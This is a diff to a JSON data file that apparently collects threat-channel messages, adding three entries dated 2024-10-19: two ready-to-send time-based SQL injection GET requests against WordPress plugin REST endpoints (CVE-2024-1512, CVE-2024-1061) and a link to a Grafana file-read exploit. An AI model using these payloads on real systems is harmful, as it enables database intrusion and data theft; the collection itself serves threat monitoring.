@@ -25158,6 +25158,38 @@
                 "schools.edu.sa\n\n",
                 "ps://mirror-h.org/zone/5777901/\n\n#"
             ]
+        },
+        {
+            "Message ID": 2328,
+            "Date": "2024-10-19",
+            "Content": "CVE-2024-1512\n\nGET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071 HTTP/1.1\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2327,
+            "Date": "2024-10-19",
+            "Content": "CVE-2024-1061\n\nGET /?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+- HTTP/1.1\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2326,
+            "Date": "2024-10-19",
+            "Content": "https://github.com/nollium/CVE-2024-9264\n\nExploit for Grafana arbitrary file-read (CVE-2024-9264)\n#github #exploit",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "https://github.com/nollium/CVE-2024-9264"
+            ]
         }
     ],
     "Anonymous Chat": [
